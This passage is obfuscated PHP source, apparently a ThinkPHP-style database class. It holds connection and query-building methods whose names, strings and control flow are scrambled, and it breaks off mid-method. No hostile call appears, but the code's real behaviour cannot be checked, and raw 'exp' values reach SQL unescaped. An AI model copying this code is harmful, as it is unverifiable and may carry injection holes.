"\123\105\114\x45\x43\x54\45\x44\111\x53\x54\111\x4e\103\124\x25\x20\x25\x46\111\105\114\104\45\40\x46\122\117\x4d\x20\x25\124\x41\102\114\105\x25\45\112\x4f\111\116\45\45\127\x48\105\122\105\45\x25\107\x52\117\x55\120\45\45\110\x41\126\111\x4e\x47\45\x25\x4f\122\x44\105\x52\45\x25\x4c\111\x4d\x49\124\45\40\45\x55\x4e\111\117\x4e\45\x25\x43\117\x4d\115\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $c‡è‰Ãè¯ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¶ªÕß‚ØÁŸ][881], $c‡è‰Ãè¯); } public function factory($Cµ¢…ĞèŞ = '') { goto fô©¥²í; cãİµ„«Ê: return $DˆƒÒß£íÓ; goto cÁ„ÎÕ…†; fô©¥²í: $eÙ¬¾áà½È =& $_SERVER[¶ªÕß‚ØÁŸ]; $Cµ¢…ĞèŞ = $this->parseConfig($Cµ¢…ĞèŞ); if (empty($Cµ¢…ĞèŞ[$eÙ¬¾áà½È[882]])) { think_exception(think_lang($eÙ¬¾áà½È[883])); } goto cªø£Ÿ¥ƒ«; cªø£Ÿ¥ƒ«: $this->dbType = ucwords(strtolower($Cµ¢…ĞèŞ[$eÙ¬¾áà½È[882]])); $BÒö’«¨ªŠ = $eÙ¬¾áà½È[884] . $this->dbType; if (class_exists($BÒö’«¨ªŠ)) { $DˆƒÒß£íÓ = new $BÒö’«¨ªŠ($Cµ¢…ĞèŞ); if ($eÙ¬¾áà½È[737] != strtolower($Cµ¢…ĞèŞ[$eÙ¬¾áà½È[882]])) { $DˆƒÒß£íÓ->dbType = strtoupper($this->dbType); } else { $DˆƒÒß£íÓ->dbType = $this->_getDsnType($Cµ¢…ĞèŞ[$eÙ¬¾áà½È[834]]); } } else { think_exception(think_lang($eÙ¬¾áà½È[885]) . $eÙ¬¾áà½È[886] . $BÒö’«¨ªŠ); } goto cãİµ„«Ê; cÁ„ÎÕ…†: } public function __call($DÔ‘³¡êâ™, $dÏÜ§”½Òä) { if (method_exists($this, $DÔ‘³¡êâ™)) { return call_user_func_array(array($this, $DÔ‘³¡êâ™), $dÏÜ§”½Òä); } } protected function _getDsnType($bÍÒ’Ÿˆîê) { $d½ÔâÑˆ‚Í = explode($_SERVER[¶ªÕß‚ØÁŸ][4], $bÍÒ’Ÿˆîê); $cÜİµ¤Úª‹ = strtoupper(trim($d½ÔâÑˆ‚Í[0])); return $cÜİµ¤Úª‹; } private function parseConfig($F‰Ôµ‰¹ˆ = '') { $BÄ¼ì»–˜ƒ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!empty($F‰Ôµ‰¹ˆ) && is_string($F‰Ôµ‰¹ˆ)) { $F‰Ôµ‰¹ˆ = $this->parseDSN($F‰Ôµ‰¹ˆ); } elseif (is_array($F‰Ôµ‰¹ˆ)) { $F‰Ôµ‰¹ˆ = array_change_key_case($F‰Ôµ‰¹ˆ); $F‰Ôµ‰¹ˆ = array($BÄ¼ì»–˜ƒ[882] => $F‰Ôµ‰¹ˆ[$BÄ¼ì»–˜ƒ[736]], $BÄ¼ì»–˜ƒ[807] => $F‰Ôµ‰¹ˆ[$BÄ¼ì»–˜ƒ[887]], $BÄ¼ì»–˜ƒ[808] => $F‰Ôµ‰¹ˆ[$BÄ¼ì»–˜ƒ[888]], $BÄ¼ì»–˜ƒ[805] => $F‰Ôµ‰¹ˆ[$BÄ¼ì»–˜ƒ[889]], $BÄ¼ì»–˜ƒ[806] => $F‰Ôµ‰¹ˆ[$BÄ¼ì»–˜ƒ[890]], $BÄ¼ì»–˜ƒ[17] => $F‰Ôµ‰¹ˆ[$BÄ¼ì»–˜ƒ[891]], $BÄ¼ì»–˜ƒ[834] => $F‰Ôµ‰¹ˆ[$BÄ¼ì»–˜ƒ[738]], $BÄ¼ì»–˜ƒ[13] => isset($F‰Ôµ‰¹ˆ[$BÄ¼ì»–˜ƒ[892]]) ? $F‰Ôµ‰¹ˆ[$BÄ¼ì»–˜ƒ[892]] : array()); } elseif (empty($F‰Ôµ‰¹ˆ)) { if (think_config($BÄ¼ì»–˜ƒ[893]) && $BÄ¼ì»–˜ƒ[737] != strtolower(think_config($BÄ¼ì»–˜ƒ[894]))) { $F‰Ôµ‰¹ˆ = $this->parseDSN(think_config($BÄ¼ì»–˜ƒ[893])); } else { $F‰Ôµ‰¹ˆ = array($BÄ¼ì»–˜ƒ[882] => think_config($BÄ¼ì»–˜ƒ[894]), $BÄ¼ì»–˜ƒ[807] => think_config($BÄ¼ì»–˜ƒ[895]), $BÄ¼ì»–˜ƒ[808] => think_config($BÄ¼ì»–˜ƒ[896]), $BÄ¼ì»–˜ƒ[805] => think_config($BÄ¼ì»–˜ƒ[897]), $BÄ¼ì»–˜ƒ[806] => think_config($BÄ¼ì»–˜ƒ[898]), $BÄ¼ì»–˜ƒ[17] => think_config($BÄ¼ì»–˜ƒ[243]), $BÄ¼ì»–˜ƒ[834] => think_config($BÄ¼ì»–˜ƒ[893]), $BÄ¼ì»–˜ƒ[13] => think_config($BÄ¼ì»–˜ƒ[899])); } } return $F‰Ôµ‰¹ˆ; } protected function initConnect($aƒˆø˜ôÎ = true) { if (1 == think_config($_SERVER[¶ªÕß‚ØÁŸ][18])) { $this->_linkID = $this->multiConnect($aƒˆø˜ôÎ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($B¼Šßê‡Ó = false) { $E—Ã…—° =& $_SERVER[¶ªÕß‚ØÁŸ]; static $a´»«Òçˆ = array(); if (empty($a´»«Òçˆ)) { foreach ($this->config as $CŸïóë“Ì» => $cóäóÈ™Õ‹) { $a´»«Òçˆ[$CŸïóë“Ì»] = explode($E—Ã…—°[47], $cóäóÈ™Õ‹); } } if (think_config($E—Ã…—°[900])) { if ($B¼Šßê‡Ó) { $c¡ùšœˆŠÔ = floor(mt_rand(0, think_config($E—Ã…—°[901]) - 1)); } else { if (is_numeric(think_config($E—Ã…—°[902]))) { $c¡ùšœˆŠÔ = think_config($E—Ã…—°[902]); } else { $c¡ùšœˆŠÔ = floor(mt_rand(think_config($E—Ã…—°[901]), count($a´»«Òçˆ[$E—Ã…—°[805]]) - 1)); } } } else { $c¡ùšœˆŠÔ = floor(mt_rand(0, count($a´»«Òçˆ[$E—Ã…—°[805]]) - 1)); } $D•ÅÑßÊ¼ = array($E—Ã…—°[807] => isset($a´»«Òçˆ[$E—Ã…—°[807]][$c¡ùšœˆŠÔ]) ? $a´»«Òçˆ[$E—Ã…—°[807]][$c¡ùšœˆŠÔ] : $a´»«Òçˆ[$E—Ã…—°[807]][0], $E—Ã…—°[808] => isset($a´»«Òçˆ[$E—Ã…—°[808]][$c¡ùšœˆŠÔ]) ? $a´»«Òçˆ[$E—Ã…—°[808]][$c¡ùšœˆŠÔ] : $a´»«Òçˆ[$E—Ã…—°[808]][0], $E—Ã…—°[805] => isset($a´»«Òçˆ[$E—Ã…—°[805]][$c¡ùšœˆŠÔ]) ? $a´»«Òçˆ[$E—Ã…—°[805]][$c¡ùšœˆŠÔ] : $a´»«Òçˆ[$E—Ã…—°[805]][0], $E—Ã…—°[806] => isset($a´»«Òçˆ[$E—Ã…—°[806]][$c¡ùšœˆŠÔ]) ? $a´»«Òçˆ[$E—Ã…—°[806]][$c¡ùšœˆŠÔ] : $a´»«Òçˆ[$E—Ã…—°[806]][0], $E—Ã…—°[17] => isset($a´»«Òçˆ[$E—Ã…—°[17]][$c¡ùšœˆŠÔ]) ? $a´»«Òçˆ[$E—Ã…—°[17]][$c¡ùšœˆŠÔ] : $a´»«Òçˆ[$E—Ã…—°[17]][0], $E—Ã…—°[834] => isset($a´»«Òçˆ[$E—Ã…—°[834]][$c¡ùšœˆŠÔ]) ? $a´»«Òçˆ[$E—Ã…—°[834]][$c¡ùšœˆŠÔ] : $a´»«Òçˆ[$E—Ã…—°[834]][0], $E—Ã…—°[13] => isset($a´»«Òçˆ[$E—Ã…—°[13]][$c¡ùšœˆŠÔ]) ? $a´»«Òçˆ[$E—Ã…—°[13]][$c¡ùšœˆŠÔ] : $a´»«Òçˆ[$E—Ã…—°[13]][0]); return $this->connect($D•ÅÑßÊ¼, $c¡ùšœˆŠÔ); } public function parseDSN($D˜¦ Œ­Äõ) { $bÓïÓ†±ã =& $_SERVER[¶ªÕß‚ØÁŸ]; if (empty($D˜¦ Œ­Äõ)) { return !1; } $cæ¢Áàƒ = parse_url($D˜¦ Œ­Äõ); if ($cæ¢Áàƒ[$bÓïÓ†±ã[178]]) { $eï…ÕÚÖ¼¨ = array($bÓïÓ†±ã[882] => $cæ¢Áàƒ[$bÓïÓ†±ã[178]], $bÓïÓ†±ã[807] => isset($cæ¢Áàƒ[$bÓïÓ†±ã[543]]) ? $cæ¢Áàƒ[$bÓïÓ†±ã[543]] : $bÓïÓ†±ã[33], $bÓïÓ†±ã[808] => isset($cæ¢Áàƒ[$bÓïÓ†±ã[903]]) ? $cæ¢Áàƒ[$bÓïÓ†±ã[903]] : $bÓïÓ†±ã[33], $bÓïÓ†±ã[805] => isset($cæ¢Áàƒ[$bÓïÓ†±ã[179]]) ? $cæ¢Áàƒ[$bÓïÓ†±ã[179]] : $bÓïÓ†±ã[33], $bÓïÓ†±ã[806] => isset($cæ¢Áàƒ[$bÓïÓ†±ã[180]]) ? $cæ¢Áàƒ[$bÓïÓ†±ã[180]] : $bÓïÓ†±ã[33], $bÓïÓ†±ã[17] => isset($cæ¢Áàƒ[$bÓïÓ†±ã[85]]) ? substr($cæ¢Áàƒ[$bÓïÓ†±ã[85]], 1) : $bÓïÓ†±ã[33]); } else { preg_match($bÓïÓ†±ã[904], trim($D˜¦ Œ­Äõ), $A¡‚‰•»¬¨); $eï…ÕÚÖ¼¨ = array($bÓïÓ†±ã[882] => $A¡‚‰•»¬¨[1], $bÓïÓ†±ã[807] => $A¡‚‰•»¬¨[2], $bÓïÓ†±ã[808] => $A¡‚‰•»¬¨[3], $bÓïÓ†±ã[805] => $A¡‚‰•»¬¨[4], $bÓïÓ†±ã[806] => $A¡‚‰•»¬¨[5], $bÓïÓ†±ã[17] => $A¡‚‰•»¬¨[6]); } $eï…ÕÚÖ¼¨[$bÓïÓ†±ã[834]] = $bÓïÓ†±ã[33]; return $eï…ÕÚÖ¼¨; } protected function debug() { $E÷’ß¤­ƒÈ =& $_SERVER[¶ªÕß‚ØÁŸ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $E÷’ß¤­ƒÈ[905]; if (think_config($E÷’ß¤­ƒÈ[906])) { think_status($E÷’ß¤­ƒÈ[907]); think_trace($this->queryStr . $E÷’ß¤­ƒÈ[908] . think_status($E÷’ß¤­ƒÈ[20], $E÷’ß¤­ƒÈ[907], 6) . $E÷’ß¤­ƒÈ[909], $E÷’ß¤­ƒÈ[33], $E÷’ß¤­ƒÈ[910]); } } protected function parseLock($FôÃŸ¬—¡’ = false) { $EÄ£Ã¿Ø¾Á =& $_SERVER[¶ªÕß‚ØÁŸ]; if (!$FôÃŸ¬—¡’) { return $EÄ£Ã¿Ø¾Á[33]; } if ($EÄ£Ã¿Ø¾Á[836] == $this->dbType) { return $EÄ£Ã¿Ø¾Á[911]; } return $EÄ£Ã¿Ø¾Á[912]; } protected function parseSet($cà ±®šŒÑ) { $f­½Ù–¬İÇ =& $_SERVER[¶ªÕß‚ØÁŸ]; foreach ($cà ±®šŒÑ as $F¾ø½Á¢ => $bïßÌçÈ…) { if (is_array($bïßÌçÈ…) && $f­½Ù–¬İÇ[294] == $bïßÌçÈ…[0]) { $B†—»¶’ÛÜ[] = $this->parseKey($F¾ø½Á¢) . $f­½Ù–¬İÇ[913] . $bïßÌçÈ…[1]; } elseif (is_scalar($bïßÌçÈ…) || is_null($bïßÌçÈ…)) { $B†—»¶’ÛÜ[] = $this->parseKey($F¾ø½Á¢) . $f­½Ù–¬İÇ[913] . $this->parseValue($bïßÌçÈ…); } } return $f­½Ù–¬İÇ[914] . implode($f­½Ù–¬İÇ[47], $B†—»¶’ÛÜ); } protected function bindParam($E¸ÏÊË¦Ö, $aÊä˜Ø•ÌÒ) { $this->bind[$_SERVER[¶ªÕß‚ØÁŸ][4] . $E¸ÏÊË¦Ö] = $aÊä˜Ø•ÌÒ; } protected function parseBind($f©ÓÀÒ˜Í¹) { $f©ÓÀÒ˜Í¹ = array_merge($this->bind, $f©ÓÀÒ˜Í¹); $this->bind = array(); return $f©ÓÀÒ˜Í¹; } function parseKey(&$dö§†°¶Ò», $aÖñˆÑóÍ© = true) { if ($aÖñˆÑóÍ©) { $dö§†°¶Ò» = $this->parseKeyCheck($dö§†°¶Ò»); } return $dö§†°¶Ò»; } function parseKeyCheck($Dæõƒ÷¥±İ) { $FÕÏÒñî»ğ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Dæõƒ÷¥±İ = trim($Dæõƒ÷¥±İ); if (!preg_match($FÕÏÒñî»ğ[915], $Dæõƒ÷¥±İ)) { think_exception($FÕÏÒñî»ğ[916] . $Dæõƒ÷¥±İ); } return $Dæõƒ÷¥±İ; } protected function parseValue($B…¸İßİ…) { $dÛ¼¿ÈÏ¢Á =& $_SERVER[¶ªÕß‚ØÁŸ]; if (is_string($B…¸İßİ…)) { $B…¸İßİ… = $dÛ¼¿ÈÏ¢Á[875] . $this->escapeString($B…¸İßİ…) . $dÛ¼¿ÈÏ¢Á[875]; } elseif (isset($B…¸İßİ…[0]) && is_string($B…¸İßİ…[0]) && strtolower($B…¸İßİ…[0]) == $dÛ¼¿ÈÏ¢Á[294]) { $B…¸İßİ… = $this->escapeString($B…¸İßİ…[1]); } elseif (is_array($B…¸İßİ…)) { $B…¸İßİ… = array_map(array($this, $dÛ¼¿ÈÏ¢Á[876]), $B…¸İßİ…); } elseif (is_bool($B…¸İßİ…)) { $B…¸İßİ… = $B…¸İßİ… ? $dÛ¼¿ÈÏ¢Á[93] : $dÛ¼¿ÈÏ¢Á[476]; } elseif (is_null($B…¸İßİ…)) { $B…¸İßİ… = $dÛ¼¿ÈÏ¢Á[109]; } return $B…¸İßİ…; } protected function parseField($a©ï¹ŠÏÖ) { $AØ¸ğß ‰ƒ =& $_SERVER[¶ªÕß‚ØÁŸ]; if (is_string($a©ï¹ŠÏÖ) && strpos($a©ï¹ŠÏÖ, $AØ¸ğß ‰ƒ[47])) { $a©ï¹ŠÏÖ = explode($AØ¸ğß ‰ƒ[47], $a©ï¹ŠÏÖ); } if (is_array($a©ï¹ŠÏÖ)) { $cŞØé‘¹ = array(); foreach ($a©ï¹ŠÏÖ as $B•Ğ½•¢ó => $d“¹¥ŠÔÑ) { if (!is_numeric($B•Ğ½•¢ó)) { $cŞØé‘¹[] = $this->parseKey($B•Ğ½•¢ó) . $AØ¸ğß ‰ƒ[917] . $this->parseKey($d“¹¥ŠÔÑ); } else { $cŞØé‘¹[] = $this->parseKey($d“¹¥ŠÔÑ); } } $bÌ›˜È‘Ç = implode($AØ¸ğß ‰ƒ[47], $cŞØé‘¹); } elseif (is_string($a©ï¹ŠÏÖ) && !empty($a©ï¹ŠÏÖ)) { $bÌ›˜È‘Ç = $a©ï¹ŠÏÖ; } else { $bÌ›˜È‘Ç = $AØ¸ğß ‰ƒ[186]; } return $bÌ›˜È‘Ç; } protected function parseTable($eÔ´®º–µ) { $FİÚ‘ó«— =& $_SERVER[¶ªÕß‚ØÁŸ]; if (is_array($eÔ´®º–µ)) { $Cóœ¹ˆš¼ = array(); foreach ($eÔ´®º–µ as $Fó»“³«„² => $Eƒù‰¬ÜŸ) { if (!is_numeric($Fó»“³«„²)) { $Cóœ¹ˆš¼[] = $this->parseKey($Fó»“³«„²) . $FİÚ‘ó«—[50] . $this->parseKey($Eƒù‰¬ÜŸ); } else { $Cóœ¹ˆš¼[] = $this->parseKey($Fó»“³«„²); } } $eÔ´®º–µ = $Cóœ¹ˆš¼; } elseif (is_string($eÔ´®º–µ)) { if (strstr($eÔ´®º–µ, $FİÚ‘ó«—[50])) { return $eÔ´®º–µ; } $eÔ´®º–µ = explode($FİÚ‘ó«—[47], $eÔ´®º–µ); array_walk($eÔ´®º–µ, array($this, $FİÚ‘ó«—[824])); } return $FİÚ‘ó«—[918] . trim(implode($FİÚ‘ó«—[919], $eÔ´®º–µ), $FİÚ‘ó«—[830]) . $FİÚ‘ó«—[918]; } protected function parseWhere($Bô÷™×±÷) { $cÂò¨ÊìÈ‡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $f‡™²ÙÕº– = $cÂò¨ÊìÈ‡[33]; if (is_string($Bô÷™×±÷)) { $f‡™²ÙÕº– = $Bô÷™×±÷; } else { $AÂ¼—„ˆœÇ = isset($Bô÷™×±÷[$cÂò¨ÊìÈ‡[920]]) ? strtoupper($Bô÷™×±÷[$cÂò¨ÊìÈ‡[920]]) : $cÂò¨ÊìÈ‡[33]; if (in_array($AÂ¼—„ˆœÇ, array($cÂò¨ÊìÈ‡[921], $cÂò¨ÊìÈ‡[922], $cÂò¨ÊìÈ‡[923]))) { $AÂ¼—„ˆœÇ = $cÂò¨ÊìÈ‡[50] . $AÂ¼—„ˆœÇ . $cÂò¨ÊìÈ‡[50]; unset($Bô÷™×±÷[$cÂò¨ÊìÈ‡[920]]); } else { $AÂ¼—„ˆœÇ = $cÂò¨ÊìÈ‡[924]; } foreach ($Bô÷™×±÷ as $FæÂ¼´É¢¯ => $c˜îÈ¾ÅùŒ) { $f‡™²ÙÕº– .= $cÂò¨ÊìÈ‡[274]; if (is_numeric($FæÂ¼´É¢¯)) { $FæÂ¼´É¢¯ = $cÂò¨ÊìÈ‡[925]; } if (0 === strpos($FæÂ¼´É¢¯, $cÂò¨ÊìÈ‡[80])) { $f‡™²ÙÕº– .= $this->parseThinkWhere($FæÂ¼´É¢¯, $c˜îÈ¾ÅùŒ); } else { if (!preg_match($cÂò¨ÊìÈ‡[926], trim($FæÂ¼´É¢¯))) { think_exception(think_lang($cÂò¨ÊìÈ‡[927]) . $cÂò¨ÊìÈ‡[4] . $FæÂ¼´É¢¯); } $EÉÓ³ÜÖ¬¤ = is_array($c˜îÈ¾ÅùŒ) && isset($c˜îÈ¾ÅùŒ[$cÂò¨ÊìÈ‡[928]]); $FæÂ¼´É¢¯ = trim($FæÂ¼´É¢¯); if (strpos($FæÂ¼´É¢¯, $cÂò¨ÊìÈ‡[280])) { $B…Šçøº¨Ï = explode($cÂò¨ÊìÈ‡[280], $FæÂ¼´É¢¯); $BÖÊñ˜›ƒ¶ = array(); foreach ($B…Šçøº¨Ï as $eÏ˜¬£ùËÀ => $eº­ë‰Ê±‡) { $eÍ–ç›¸ó« = $EÉÓ³ÜÖ¬¤ ? $c˜îÈ¾ÅùŒ[$eÏ˜¬£ùËÀ] : $c˜îÈ¾ÅùŒ; $BÖÊñ˜›ƒ¶[] = $cÂò¨ÊìÈ‡[257] . $this->parseWhereItem($this->parseKey($eº­ë‰Ê±‡), $eÍ–ç›¸ó«) . $cÂò¨ÊìÈ‡[823]; } $f‡™²ÙÕº– .= implode($cÂò¨ÊìÈ‡[929], $BÖÊñ˜›ƒ¶); } elseif (strpos($FæÂ¼´É¢¯, $cÂò¨ÊìÈ‡[281])) { $B…Šçøº¨Ï = explode($cÂò¨ÊìÈ‡[281], $FæÂ¼´É¢¯); $BÖÊñ˜›ƒ¶ = array(); foreach ($B…Šçøº¨Ï as $eÏ˜¬£ùËÀ => $eº­ë‰Ê±‡) { $eÍ–ç›¸ó« = $EÉÓ³ÜÖ¬¤ ? $c˜îÈ¾ÅùŒ[$eÏ˜¬£ùËÀ] : $c˜îÈ¾ÅùŒ; $BÖÊñ˜›ƒ¶[] = $cÂò¨ÊìÈ‡[257] . $this->parseWhereItem($this->parseKey($eº­ë‰Ê±‡), $eÍ–ç›¸ó«) . $cÂò¨ÊìÈ‡[823]; } $f‡™²ÙÕº– .= implode($cÂò¨ÊìÈ‡[924], $BÖÊñ˜›ƒ¶); } else { $f‡™²ÙÕº– .= $this->parseWhereItem($this->parseKey($FæÂ¼´É¢¯), $c˜îÈ¾ÅùŒ); } } $f‡™²ÙÕº– .= $cÂò¨ÊìÈ‡[275] . $AÂ¼—„ˆœÇ; } $f‡™²ÙÕº– = substr($f‡™²ÙÕº–, 0, -strlen($AÂ¼—„ˆœÇ)); } return empty($f‡™²ÙÕº–) ? $cÂò¨ÊìÈ‡[33] : $cÂò¨ÊìÈ‡[930] . $f‡™²ÙÕº–; } protected function parseWhereItem($Fñ¾èôÕÛÕ, $aÅª‡ºŒĞø) { $EÂ­øˆÙ“ =& $_SERVER[¶ªÕß‚ØÁŸ]; $bŠ›‘ŸË˜ = $EÂ­øˆÙ“[33]; if (is_array($aÅª‡ºŒĞø)) { if (is_string($aÅª‡ºŒĞø[0])) { $EŒ–œš‚® = strtolower($aÅª‡ºŒĞø[0]); if (in_array($aÅª‡ºŒĞø[0], array($EÂ­øˆÙ“[913], $EÂ­øˆÙ“[931], $EÂ­øˆÙ“[932], $EÂ­øˆÙ“[933], $EÂ­øˆÙ“[934], $EÂ­øˆÙ“[935]))) { $bŠ›‘ŸË˜ .= $Fñ¾èôÕÛÕ . $EÂ­øˆÙ“[50] . $aÅª‡ºŒĞø[0] . $EÂ­øˆÙ“[50] . $this->parseValue($aÅª‡ºŒĞø[1]); } elseif (preg_match($EÂ­øˆÙ“[936], $aÅª‡ºŒĞø[0])) { $bŠ›‘ŸË˜ .= $Fñ¾èôÕÛÕ . $EÂ­øˆÙ“[50] . $this->exp[$EŒ–œš‚®] . $EÂ­øˆÙ“[50] . $this->parseValue($aÅª‡ºŒĞø[1]); } elseif (preg_match($EÂ­øˆÙ“[937], $aÅª‡ºŒĞø[0])) { if (is_array($aÅª‡ºŒĞø[1])) { $AÊ£íğ½¾ñ = isset($aÅª‡ºŒĞø[2]) ? strtoupper($aÅª‡ºŒĞø[2]) : $EÂ­øˆÙ“[922]; if (in_array($AÊ£íğ½¾ñ, array($EÂ­øˆÙ“[921], $EÂ­øˆÙ“[922], $EÂ­øˆÙ“[923]))) { $AÇ¶Ñ‘¾©¶ = array(); foreach ($aÅª‡ºŒĞø[1] as $eŒïö¾»·) { $AÇ¶Ñ‘¾©¶[] = $Fñ¾èôÕÛÕ . $EÂ­øˆÙ“[50] . $this->exp[$EŒ–œš‚®] . $EÂ­øˆÙ“[50] . $this->parseValue($eŒïö¾»·); } $bŠ›‘ŸË˜ .= $EÂ­øˆÙ“[257] . implode($EÂ­øˆÙ“[50] . $AÊ£íğ½¾ñ . $EÂ­øˆÙ“[50], $AÇ¶Ñ‘¾©¶) . $EÂ­øˆÙ“[823]; } } else { $bŠ›‘ŸË˜ .= $Fñ¾èôÕÛÕ . $EÂ­øˆÙ“[50] . $this->exp[$EŒ–œš‚®] . $EÂ­øˆÙ“[50] . $this->parseValue($aÅª‡ºŒĞø[1]); } } elseif ($EÂ­øˆÙ“[294] == $EŒ–œš‚®) { $bŠ›‘ŸË˜ .= $EÂ­øˆÙ“[821] . $Fñ¾èôÕÛÕ . $EÂ­øˆÙ“[50] . $aÅª‡ºŒĞø[1] . $EÂ­øˆÙ“[938]; } elseif (preg_match($EÂ­øˆÙ“[939], $aÅª‡ºŒĞø[0])) { if (isset($aÅª‡ºŒĞø[2]) && $EÂ­øˆÙ“[294] == $aÅª‡ºŒĞø[2]) { $bŠ›‘ŸË˜ .= $Fñ¾èôÕÛÕ . $EÂ­øˆÙ“[50] . $this->exp[$EŒ–œš‚®] . $EÂ­øˆÙ“[50] . $aÅª‡ºŒĞø[1]; } else { if (is_string($aÅª‡ºŒĞø[1])) { $aÅª‡ºŒĞø[1] = explode($EÂ­øˆÙ“[47], $aÅª‡ºŒĞø[1]); } $Cô½Æ×Ã” = implode($EÂ­øˆÙ“[47], $this->parseValue($aÅª‡ºŒĞø[1])); $bŠ›‘ŸË˜ .= $Fñ¾èôÕÛÕ . $EÂ­øˆÙ“[50] . $this->exp[$EŒ–œš‚®] . $EÂ­øˆÙ“[821] . $Cô½Æ×Ã” . $EÂ­øˆÙ“[823]; } } elseif (preg_match($EÂ­øˆÙ“[940], $aÅª‡ºŒĞø[0])) { $E…À»¦ÄòÂ = is_string($aÅª‡ºŒĞø[1]) ? explode($EÂ­øˆÙ“[47], $aÅª‡ºŒĞø[1]) : $aÅª‡ºŒĞø[1]; $bŠ›‘ŸË˜ .= $EÂ­øˆÙ“[821] . $Fñ¾èôÕÛÕ . $EÂ­øˆÙ“[50] . $this->exp[$EŒ–œš‚®] . $EÂ­øˆÙ“[50] . $this->parseValue($E…À»¦ÄòÂ[0]) . $EÂ­øˆÙ“[924] . $this->parseValue($E…À»¦ÄòÂ[1]) . $EÂ­øˆÙ“[275]; } else { think_exception(think_lang($EÂ­øˆÙ“[927]) . $EÂ­øˆÙ“[4] . $aÅª‡ºŒĞø[0]); } } else { $C¦¨„”£ÌÏ = count($aÅª‡ºŒĞø); $eø·á’îë = isset($aÅª‡ºŒĞø[$C¦¨„”£ÌÏ - 1]) ? strtoupper($aÅª‡ºŒĞø[$C¦¨„”£ÌÏ - 1]) : $EÂ­øˆÙ“[33]; if (in_array($eø·á’îë, array($EÂ­øˆÙ“[921], $EÂ­øˆÙ“[922], $EÂ­øˆÙ“[923]))) { $C¦¨„”£ÌÏ = $C¦¨„”£ÌÏ - 1; } else { $eø·á’îë = $EÂ­øˆÙ“[921]; } for ($AÃ‘ÈÖÒš = 0; $AÃ‘ÈÖÒš < $C¦¨„”£ÌÏ; $AÃ‘ÈÖÒš++) { $E…À»¦ÄòÂ = is_array($aÅª‡ºŒĞø[$AÃ‘ÈÖÒš]) ? $aÅª‡ºŒĞø[$AÃ‘ÈÖÒš][1] : $aÅª‡ºŒĞø[$AÃ‘ÈÖÒš]; if ($EÂ­øˆÙ“[294] == strtolower($aÅª‡ºŒĞø[$AÃ‘ÈÖÒš][0])) { $bŠ›‘ŸË˜ .= $EÂ­øˆÙ“[257] . $Fñ¾èôÕÛÕ . $EÂ­øˆÙ“[50] . $E…À»¦ÄòÂ . $EÂ­øˆÙ“[938] . $eø·á’îë . $EÂ­øˆÙ“[50]; } else { $BÅÛƒá° = is_array($aÅª‡ºŒĞø[$AÃ‘ÈÖÒš]) ? $this->exp[strtolower($aÅª‡ºŒĞø[$AÃ‘ÈÖÒš][0])] : $EÂ­øˆÙ“[913]; if (!$BÅÛƒá° && is_array($aÅª‡ºŒĞø[$AÃ‘ÈÖÒš]) && in_array($aÅª‡ºŒĞø[$AÃ‘ÈÖÒš][0], array($EÂ­øˆÙ“[913], $EÂ­øˆÙ“[931], $EÂ­øˆÙ“[932], $EÂ­øˆÙ“[933], $EÂ­øˆÙ“[934], $EÂ­øˆÙ“[935]))) { $BÅÛƒá° = $aÅª‡ºŒĞø[$AÃ‘ÈÖÒš][0]; } $bŠ›‘ŸË˜ .= $EÂ­øˆÙ“[257] . $Fñ¾èôÕÛÕ . $EÂ­øˆÙ“[50] . $BÅÛƒá° . $EÂ­øˆÙ“[50] . $this->parseValue($E…À»¦ÄòÂ) . $EÂ­øˆÙ“[938] . $eø·á’îë . $EÂ­øˆÙ“[50]; } } $bŠ›‘ŸË˜ = substr($bŠ›‘ŸË˜, 0, -4); } } else { $bŠ›‘ŸË˜ .= $Fñ¾èôÕÛÕ . $EÂ­øˆÙ“[941] . $this->parseValue($aÅª‡ºŒĞø); } return $bŠ›‘ŸË˜; } protected function parseThinkWhere($B“¾Åí™’, $f¥™İÈÚ‚ù) { $dòì‘Å‹¡´ =& $_SERVER[¶ªÕß‚ØÁŸ]; $aÁœØ´Å¬ = $dòì‘Å‹¡´[33]; switch ($B“¾Åí™’) { case $dòì‘Å‹¡´[348]: $aÁœØ´Å¬ = $f¥™İÈÚ‚ù; break; case $dòì‘Å‹¡´[925]: $aÁœØ´Å¬ = is_string($f¥™İÈÚ‚ù) ? $f¥™İÈÚ‚ù : substr($this->parseWhere($f¥™İÈÚ‚ù), 6); break; case $dòì‘Å‹¡´[942]: parse_str($f¥™İÈÚ‚ù, $F¬‰ŒÍˆ÷í); if (isset($F¬‰ŒÍˆ÷í[$dòì‘Å‹¡´[920]])) { $C“­¶­Ë²È = $dòì‘Å‹¡´[50] . strtoupper($F¬‰ŒÍˆ÷í[$dòì‘Å‹¡´[920]]) . $dòì‘Å‹¡´[50]; unset($F¬‰ŒÍˆ÷í[$dòì‘Å‹¡´[920]]); } else { $C“­¶­Ë²È = $dòì‘Å‹¡´[924]; } $fÎæõêÈ¹µ = array(); foreach ($F¬‰ŒÍˆ÷í as $a¢çİ†ÒÍõ => $bÀ×•À‚Àå) { $fÎæõêÈ¹µ[] = $this->parseKey($a¢çİ†ÒÍõ) . $dòì‘Å‹¡´[941] . $this->parseValue($bÀ×•À‚Àå); } $aÁœØ´Å¬ = implode($C“­¶­Ë²È, $fÎæõêÈ¹µ); break; } return $aÁœØ´Å¬; } protected function parseLimit($Eø«ñºØß) { $F‘äŞö«Ø¨ =& $_SERVER[¶ªÕß‚ØÁŸ]; return !empty($Eø«ñºØß) ? $F‘äŞö«Ø¨[48] . $Eø«ñºØß . $F‘äŞö«Ø¨[50] : $F‘äŞö«Ø¨[33]; } protected function parseJoin($C‰ÂÚŒäÌ•) { $B»ô†»ÂÆ =& $_SERVER[¶ªÕß‚ØÁŸ]; $EÉ‹“´ŒÚõ = $B»ô†»ÂÆ[33]; if (!empty($C‰ÂÚŒäÌ•)) { if (is_array($C‰ÂÚŒäÌ•)) { foreach ($C‰ÂÚŒäÌ• as $bŠ²ƒÅ¦‚ => $C‡ªâô£ª±) { if (!1 !== stripos($C‡ªâô£ª±, $B»ô†»ÂÆ[943])) { $EÉ‹“´ŒÚõ .= $B»ô†»ÂÆ[50] . $C‡ªâô£ª±; } else { 